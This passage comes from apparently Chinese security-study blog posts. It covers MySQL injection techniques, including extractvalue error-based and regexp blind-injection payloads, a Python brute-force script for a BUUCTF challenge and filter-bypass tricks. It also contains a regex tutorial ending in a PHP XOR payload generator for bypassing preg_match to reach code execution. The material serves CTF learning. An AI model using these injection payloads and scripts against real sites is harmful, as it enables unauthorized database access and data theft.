<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">global</span> <span class="variable">$wpdb</span>;</span><br><span class="line"><span class="variable">$wpdb</span>-&gt;<span class="title function_ invoke__">query</span>(</span><br><span class="line">    <span class="variable">$wpdb</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT name FROM people WHERE id = %d OR email = %s&#x27;</span>,</span><br><span class="line">        <span class="variable">$person_id</span>, <span class="variable">$person_email</span></span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">global</span> <span class="variable">$wpdb</span>;</span><br><span class="line"><span class="variable">$wpdb</span>-&gt;<span class="title function_ invoke__">insert</span>( <span class="string">&#x27;people&#x27;</span>,</span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;person_id&#x27;</span> =&gt; <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;person_email&#x27;</span> =&gt; <span class="string">&#x27;bobby@tables.com&#x27;</span></span><br><span class="line">        ),</span><br><span class="line">    <span class="keyword">array</span>( <span class="string">&#x27;%d&#x27;</span>, <span class="string">&#x27;%s&#x27;</span> )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>



<h2 id="报错注入，返回多行限制"><a href="#报错注入，返回多行限制" class="headerlink" title="报错注入，返回多行限制"></a>报错注入，返回多行限制</h2><blockquote>
<p>适用于过滤了空格，left和right</p>
</blockquote>
<blockquote>
<p>admin”||extractvalue(1,concat(0x7e,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(‘^f’))))#</p>
</blockquote>
<p>用regexp进行正则匹配f开头的内容所在行</p>
<p>如果超过限制32位，可以用reverse逆向输出正则匹配所在行</p>
<blockquote>
<p>admin”||extractvalue(1,concat(0x7e,reverse((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(‘^f’)))))#</p>
</blockquote>
<h2 id="正则注入"><a href="#正则注入" class="headerlink" title="正则注入"></a>正则注入</h2><p>这个注入方式呢相当于<a href="https://so.csdn.net/so/search?q=%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8&spm=1001.2101.3001.7020">布尔盲注</a>吧，若是猜对了就返回正确的页面，我们本地测试一下正则，先看一下全部数据，然后^匹配e开头的password</p>
<p>![{BF2E734F-AC80-42F4-93E1-4C7F60DB1B8E}](MySQL 注入攻击与防御&#x2F;{BF2E734F-AC80-42F4-93E1-4C7F60DB1B8E}.png)</p>
<p>无对应匹配结果返回空，</p>
<p>![{F19B2D9C-C97F-4F8F-ABC5-8537DF97F426}](MySQL 注入攻击与防御&#x2F;{F19B2D9C-C97F-4F8F-ABC5-8537DF97F426}.png)</p>
<p>分析<br>回到题目里，提示给了串SQL语句</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">username</span>=<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> <span class="attribute">passwd</span>=<span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>想要猜解admin的密码需要用到admin，可是题目过滤掉了admin，但是我们能用其他方法绕过，让username&#x3D;\，将语句后面的单引号给转义掉，我们可以构造这样的payload</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">username</span>=\&amp;passwd=||sql<span class="comment">;%00</span></span><br></pre></td></tr></table></figure>

<p>因为题目过滤掉了空格，空格能用内联注释符&#x2F;**&#x2F;代替</p>
<p>注释符#和–  被过滤掉了，这里用;%00截断注释后面的内容</p>
<p>放入原查询语句相当于</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">username</span>=<span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> <span class="attribute">passwd</span>=<span class="string">&#x27;||sql;%00&#x27;</span></span><br></pre></td></tr></table></figure>

<p>即</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> <span class="keyword">sql</span>;<span class="operator">%</span><span class="number">00</span></span><br></pre></td></tr></table></figure>

<p> 这时候就能利用正则进行注入了构建payload</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="attr">username</span><span class="operator">=</span>\<span class="variable">&amp;passwd</span>=||<span class="comment">/**/</span>passwd<span class="comment">/**/</span>regexp<span class="comment">/**/</span><span class="string">&quot;^x&quot;</span><span class="punctuation">;</span>%<span class="number">00</span></span><br></pre></td></tr></table></figure>

<p>相当于</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> <span class="comment">/**/</span>passwd<span class="comment">/**/</span>regexp<span class="comment">/**/</span><span class="string">&quot;^x&quot;</span>;%<span class="number">00</span></span><br></pre></td></tr></table></figure>

<p>用burp进行爆破，</p>
<p>![image-20250204133455353](MySQL 注入攻击与防御&#x2F;image-20250204133455353.png)</p>
<p>可以发现Yy响应长度不一样，因为里面没有弹窗alert提醒标签</p>
<p>![image-20250204133550375](MySQL 注入攻击与防御&#x2F;image-20250204133550375.png)</p>
<p>所以得出密码第一位是Y（y）不区分大小写</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#buuctf web [NCTF2019]SQLi</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2e2494c3-b85d-49f4-81b8-63ee389a9c30.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">pw_fuzz = string.ascii_lowercase + string.digits + <span class="string">&quot;_&quot;</span>      <span class="comment">#密码字典：小写字母和数字还有下划线</span></span><br><span class="line">pw = <span class="string">&quot;&quot;</span>     <span class="comment">#admin的密码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pw_fuzz:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;\x00&#x27;</span>.<span class="built_in">format</span>((pw+i)) <span class="comment">#以此匹配开头，直到pw是完整flag</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;alert&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">            pw = pw + i</span><br><span class="line">            <span class="built_in">print</span>(pw)</span><br></pre></td></tr></table></figure>

<h2 id="Mysql-字符串运算"><a href="#Mysql-字符串运算" class="headerlink" title="Mysql 字符串运算"></a>Mysql 字符串运算</h2><p> mysql的字符串运算</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;1&#x27; + &#x27;2&#x27;</span><br><span class="line"># 3</span><br><span class="line">select &#x27;1&#x27;+database()+&#x27;0&#x27;;</span><br><span class="line">#1</span><br><span class="line">select &#x27;0&#x27;+hex(database())+&#x27;0&#x27;;</span><br><span class="line">#776562 -&gt; web的16进制</span><br><span class="line">select &#x27;0&#x27;+ascii(substr(database(),1,1))+&#x27;0&#x27;;</span><br><span class="line">#119 -&gt; w的ascii码</span><br><span class="line">select &#x27;0&#x27;+ascii(substr(database() from 1 for 1))+&#x27;0&#x27;;</span><br><span class="line">##119 -&gt; w的ascii码</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>正则绕过总结</title>
    <url>/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<blockquote>
<p>来自<a href="https://xiaolong22333.top/archives/47/">https://xiaolong22333.top/archives/47/</a></p>
</blockquote>
<h1 id="正则绕过总结正则表达式"><a href="#正则绕过总结正则表达式" class="headerlink" title="正则绕过总结正则表达式"></a>正则绕过总结正则表达式</h1><p><code>正则绕过总结正则表达式</code> </p>
<span id="more"></span>

<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>正则表达式(regular expression)描述了一种字符串匹配的模式，可以用来检查一个串是否含有某种子串、将匹配的子串做替换或者从某个串中取出符合某个条件的子串等。</p>
<ul>
<li>列目录时，dir <em>.txt或ls <em>.txt中的</em>.txt就不是一个正则表达式,因为这里</em>与正则式的*的含义是不同的。</li>
<li>构造正则表达式的方法和创建数学表达式的方法一样。也就是用多种元字符与运算符可以将小的表达式结合在一起来创建更大的表达式。正则表达式的组件可以是单个的字符、字符集合、字符范围、字符间的选择或者所有这些组件的任意组合。</li>
</ul>
<p>正则表达式是由普通字符（例如字符 a 到 z）以及特殊字符（称为”元字符”）组成的文字模式。模式描述在搜索文本时要匹配的一个或多个字符串。正则表达式作为一个模板，将某个字符模式与所搜索的字符串进行匹配。</p>
<h2 id="普通字符"><a href="#普通字符" class="headerlink" title="普通字符"></a>普通字符</h2><p>普通字符包括没有显式指定为元字符的所有可打印和不可打印字符。这包括所有大写和小写字母、所有数字、所有标点符号和一些其他符号。</p>
<h2 id="非打印字符"><a href="#非打印字符" class="headerlink" title="非打印字符"></a>非打印字符</h2><p>非打印字符也可以是正则表达式的组成部分。下表列出了表示非打印字符的转义序列：</p>
<table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">\cx</td>
<td align="left">匹配由x指明的控制字符。例如，<code> \cM</code> 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。</td>
</tr>
<tr>
<td align="left">\f</td>
<td align="left">匹配一个换页符。等价于 <code>\x0c</code> 和 <code>\cL</code>。</td>
</tr>
<tr>
<td align="left">\n</td>
<td align="left">匹配一个换行符。等价于 <code>\x0a </code>和<code> \cJ</code>。</td>
</tr>
<tr>
<td align="left">\r</td>
<td align="left">匹配一个回车符。等价于 <code>\x0d</code> 和 <code>\cM</code>。</td>
</tr>
<tr>
<td align="left">\s</td>
<td align="left">匹配任何空白字符，包括空格、制表符、换页符等等。等价于 <code>[ \f\n\r\t\v]</code>。</td>
</tr>
<tr>
<td align="left">\S</td>
<td align="left">匹配任何非空白字符。等价于<code> [^ \f\n\r\t\v]</code>。</td>
</tr>
<tr>
<td align="left">\t</td>
<td align="left">匹配一个制表符。等价于<code> \x09</code> 和 <code>\cI</code>。</td>
</tr>
<tr>
<td align="left">\v</td>
<td align="left">匹配一个垂直制表符。等价于 <code>\x0b</code> 和 <code>\cK</code>。</td>
</tr>
</tbody></table>
<h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><p>所谓特殊字符，就是一些有特殊含义的字符，如上面说的”<em>.txt”中的</em>，简单的说就是表示任何字符串的意思。如果要查找文件名中有<em>的文件，则需要对</em>进行转义，即在其前加一个\。ls *.txt。</p>
<p>许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符”转义”，即，将反斜杠字符 () 放在它们前面。下表列出了正则表达式中的特殊字符：</p>
<table>
<thead>
<tr>
<th align="left">特别字符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$</td>
<td align="left">匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用<code> \$</code>。</td>
</tr>
<tr>
<td align="left">( )</td>
<td align="left">标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 <code>\(</code> 和 <code>\)</code>。</td>
</tr>
<tr>
<td align="left">*</td>
<td align="left">匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 <code>\*</code>。</td>
</tr>
<tr>
<td align="left">+</td>
<td align="left">匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 <code>\+</code>。</td>
</tr>
<tr>
<td align="left">.</td>
<td align="left">匹配除换行符 \n之外的任何单字符。要匹配 .，请使用<code> \.</code>。</td>
</tr>
<tr>
<td align="left">[</td>
<td align="left">标记一个中括号表达式的开始。要匹配 [，请使用 <code>\[</code>。</td>
</tr>
<tr>
<td align="left">?</td>
<td align="left">匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用<code> \?</code>。</td>
</tr>
<tr>
<td align="left">\</td>
<td align="left">将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。</td>
</tr>
<tr>
<td align="left">^</td>
<td align="left">匹配输入字符串的开始位置，除非在方括号表达式中使用，此时它表示不接受该字符集合。要匹配 ^ 字符本身，请使用 <code>\^</code>。</td>
</tr>
<tr>
<td align="left">{</td>
<td align="left">标记限定符表达式的开始。要匹配 {，请使用<code> \&#123;</code>。</td>
</tr>
<tr>
<td align="left">|</td>
<td align="left">指明两项之间的一个选择。要匹配 |，请使用 <code>|</code>。</td>
</tr>
</tbody></table>
<h2 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h2><p>限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有*或+或?或{n}或{n,}或{n,m}共6种。</p>
<p>正则表达式的限定符有：</p>
<table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">*</td>
<td align="left">匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td>
</tr>
<tr>
<td align="left">+</td>
<td align="left">匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td>
</tr>
<tr>
<td align="left">?</td>
<td align="left">匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。</td>
</tr>
<tr>
<td align="left">{n}</td>
<td align="left">n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td>
</tr>
<tr>
<td align="left">{n,}</td>
<td align="left">n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</td>
</tr>
<tr>
<td align="left">{n,m}</td>
<td align="left">m 和 n 均为非负整数，其中n &lt;&#x3D; m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td>
</tr>
</tbody></table>
<p>由于章节编号在大的输入文档中会很可能超过九，所以您需要一种方式来处理两位或三位章节编号。限定符给您这种能力。下面的正则表达式匹配编号为任何位数的章节标题：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">/Chapter <span class="selector-attr">[1-9]</span><span class="selector-attr">[0-9]</span>*/</span><br></pre></td></tr></table></figure>

<p>请注意，限定符出现在范围表达式之后。因此，它应用于整个范围表达式，在本例中，只指定从 0 到 9 的数字（包括 0 和 9）。</p>
<p>这里不使用 + 限定符，因为在第二个位置或后面的位置不一定需要有一个数字。也不使用？字符，因为它将章节编号限制到只有两位数。您需要至少匹配 Chapter 和空格字符后面的一个数字。</p>
<p>如果您知道章节编号被限制为只有 99 章，可以使用下面的表达式来至少指定一位但至多两位数字。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/Chapter [0-9]&#123;1,2&#125;/</span></span><br></pre></td></tr></table></figure>

<p>上面的表达式的缺点是，大于 99 的章节编号仍只匹配开头两位数字。另一个缺点是 Chapter 0 也将匹配。只匹配两位数字的更好的表达式如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">/Chapter <span class="selector-attr">[1-9]</span><span class="selector-attr">[0-9]</span>?/</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">/Chapter <span class="selector-attr">[1-9]</span><span class="selector-attr">[0-9]</span>&#123;<span class="number">0</span>,<span class="number">1</span>&#125;/</span><br></pre></td></tr></table></figure>

<p>*<strong>、+和?限定符都是贪婪的，因为它们会尽可能多的匹配文字，只有在它们的后面加上一个?就可以实现非贪婪或最小匹配。</strong></p>
<p>例如，您可能搜索 HTML 文档，以查找括在 H1 标记内的章节标题。该文本在您的文档中如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">H1</span>&gt;Chapter <span class="number">1</span> – Introduction <span class="selector-tag">to</span> Regular Expressions&lt;/<span class="selector-tag">H1</span>&gt;</span><br></pre></td></tr></table></figure>

<p>下面的表达式匹配从开始小于符号 (&lt;) 到关闭 H1 标记的大于符号 (&gt;) 之间的所有内容。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/&lt;.*&gt;/</span></span><br></pre></td></tr></table></figure>

<p>如果您只需要匹配开始 H1 标记，下面的”非贪心”表达式只匹配 <H1>。</H1></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/&lt;.*?&gt;/</span></span><br></pre></td></tr></table></figure>

<p>通过在 *、+ 或 ? 限定符之后放置 ?，该表达式从”贪心”表达式转换为”非贪心”表达式或者最小匹配。</p>
<h2 id="定位符"><a href="#定位符" class="headerlink" title="定位符"></a>定位符</h2><p>定位符使您能够将正则表达式固定到行首或行尾。它们还使您能够创建这样的正则表达式，这些正则表达式出现在一个单词内、在一个单词的开头或者一个单词的结尾。</p>
<p>定位符用来描述字符串或单词的边界，^和$分别指字符串的开始与结束，<code>\b</code>描述单词的前或后边界，<code>\B</code>表示非单词边界。</p>
<p>正则表达式的限定符有：</p>
<table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">^</td>
<td align="left">匹配输入字符串开始的位置。如果设置了 RegExp 对象的 Multiline 属性，^ 还会与 <code>\n</code> 或<code> \r</code> 之后的位置匹配。</td>
</tr>
<tr>
<td align="left">$</td>
<td align="left">匹配输入字符串结尾的位置。如果设置了 RegExp 对象的 Multiline 属性，$ 还会与<code>\n</code>或 <code>\r</code> 之前的位置匹配。</td>
</tr>
<tr>
<td align="left">\b</td>
<td align="left">匹配一个字边界，即字与空格间的位置。</td>
</tr>
<tr>
<td align="left">\B</td>
<td align="left">非字边界匹配。</td>
</tr>
</tbody></table>
<p><strong>注意</strong>：不能将限定符与定位点一起使用。由于在紧靠换行或者字边界的前面或后面不能有一个以上位置，因此不允许诸如 ^* 之类的表达式。</p>
<p>若要匹配一行文本开始处的文本，请在正则表达式的开始使用 ^ 字符。不要将 ^ 的这种用法与中括号表达式内的用法混淆。</p>
<p>若要匹配一行文本的结束处的文本，请在正则表达式的结束处使用 $ 字符。</p>
<p>若要在搜索章节标题时使用定位点，下面的正则表达式匹配一个章节标题，该标题只包含两个尾随数字，并且出现在行首：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">/^Chapter <span class="selector-attr">[1-9]</span><span class="selector-attr">[0-9]</span>&#123;<span class="number">0</span>,<span class="number">1</span>&#125;/</span><br></pre></td></tr></table></figure>

<p>真正的章节标题不仅出现行的开始处，而且它还是该行中仅有的文本。它即出现在行首又出现在同一行的结尾。下面的表达式能确保指定的匹配只匹配章节而不匹配交叉引用。通过创建只匹配一行文本的开始和结尾的正则表达式，就可做到这一点。</p>
<figure class="highlight inform7"><table><tr><td class="code"><pre><span class="line">/^Chapter <span class="comment">[1-9]</span><span class="comment">[0-9]</span>&#123;0,1&#125;$/</span><br></pre></td></tr></table></figure>

<p>匹配字边界稍有不同，但向正则表达式添加了很重要的能力。字边界是单词和空格之间的位置。非字边界是任何其他位置。下面的表达式匹配单词 Chapter 的开头三个字符，因为这三个字符出现字边界后面：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/\bCha/</span></span><br></pre></td></tr></table></figure>

<p><code>\b </code>字符的位置是非常重要的。如果它位于要匹配的字符串的开始，它在单词的开始处查找匹配项。如果它位于字符串的结尾，它在单词的结尾处查找匹配项。例如，下面的表达式匹配单词 Chapter 中的字符串 ter，因为它出现在字边界的前面：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/ter\b/</span></span><br></pre></td></tr></table></figure>

<p>下面的表达式匹配 Chapter 中的字符串 apt，但不匹配 aptitude 中的字符串 apt：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/\Bapt/</span></span><br></pre></td></tr></table></figure>

<p>字符串 apt 出现在单词 Chapter 中的非字边界处，但出现在单词 aptitude 中的字边界处。对于 \B 非字边界运算符，位置并不重要，因为匹配不关心究竟是单词的开头还是结尾。</p>
<h2 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h2><p>用圆括号将所有选择项括起来，相邻的选择项之间用|分隔。但用圆括号会有一个副作用，是相关的匹配会被缓存，此时可用?:放在第一个选项前来消除这种副作用。</p>
<p>其中?:是非捕获元之一，还有两个非捕获元是?&#x3D;和?!，这两个还有更多的含义，前者为正向预查，在任何开始匹配圆括号内的正则表达式模式的位置来匹配搜索字符串，后者为负向预查，在任何开始不匹配该正则表达式模式的位置来匹配搜索字符串。</p>
<h2 id="反向引用"><a href="#反向引用" class="headerlink" title="反向引用"></a>反向引用</h2><p>对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>
<p>可以使用非捕获元字符 ‘?:’、’?&#x3D;’ 或 ‘?!’ 来重写捕获，忽略对相关匹配的保存。</p>
<p>反向引用的最简单的、最有用的应用之一，是提供查找文本中两个相同的相邻单词的匹配项的能力。以下面的句子为例：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Is</span> <span class="keyword">is</span> the <span class="keyword">cost</span> <span class="keyword">of</span> <span class="keyword">of</span> gasoline going up up?</span><br></pre></td></tr></table></figure>

<p>上面的句子很显然有多个重复的单词。如果能设计一种方法定位该句子，而不必查找每个单词的重复出现，那该有多好。下面的正则表达式使用单个子表达式来实现这一点：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">/\<span class="selector-tag">b</span>(<span class="selector-attr">[a-z]</span>+) \<span class="number">1</span>\<span class="selector-tag">b</span>/gi</span><br></pre></td></tr></table></figure>

<p>捕获的表达式，正如 [a-z]+ 指定的，包括一个或多个字母。正则表达式的第二部分是对以前捕获的子匹配项的引用，即，单词的第二个匹配项正好由括号表达式匹配。\1 指定第一个子匹配项。字边界元字符确保只检测整个单词。否则，诸如”is issued”或”this is”之类的词组将不能正确地被此表达式识别。</p>
<p>正则表达式后面的全局标记 (g) 指示，将该表达式应用到输入字符串中能够查找到的尽可能多的匹配。表达式的结尾处的不区分大小写 (i) 标记指定不区分大小写。多行标记指定换行符的两边可能出现潜在的匹配。</p>
<p>反向引用还可以将通用资源指示符 (URI) 分解为其组件。假定您想将下面的 URI 分解为协议（ftp、http 等等）、域地址和页&#x2F;路径：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>www.w3cschool.cn:<span class="number">80</span><span class="regexp">/html/</span>html-tutorial.html</span><br></pre></td></tr></table></figure>

<p>下面的正则表达式提供该功能：</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">/<span class="comment">(\w+)</span>:\/\/<span class="comment">([^/:]+)</span><span class="comment">(:\d*)</span>?<span class="comment">([^# ]*)</span>/</span><br></pre></td></tr></table></figure>

<p>第一个括号子表达式捕获 Web 地址的协议部分。该子表达式匹配在冒号和两个正斜杠前面的任何单词。第二个括号子表达式捕获地址的域地址部分。子表达式匹配 &#x2F; 或 : 之外的一个或多个字符。第三个括号子表达式捕获端口号（如果指定了的话）。该子表达式匹配冒号后面的零个或多个数字。只能重复一次该子表达式。最后，第四个括号子表达式捕获 Web 地址指定的路径和&#x2F;或页信息。该子表达式能匹配不包括 # 或空格字符的任何字符序列。</p>
<p>将正则表达式应用到上面的 URI，各子匹配项包含下面的内容：</p>
<ul>
<li>第一个括号子表达式包含”http”</li>
<li>第二个括号子表达式包含”<a href="http://www.w3cschool.cn/">www.w3cschool.cn</a>“</li>
<li>第三个括号子表达式包含”:80”</li>
<li>第四个括号子表达式包含”&#x2F;html&#x2F;html-tutorial.html”</li>
</ul>
<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">        <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">        <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">            <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line"><span class="keyword">from</span> sys import *</span><br><span class="line">import os</span><br><span class="line">def <span class="title function_ invoke__">action</span>(arg):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span 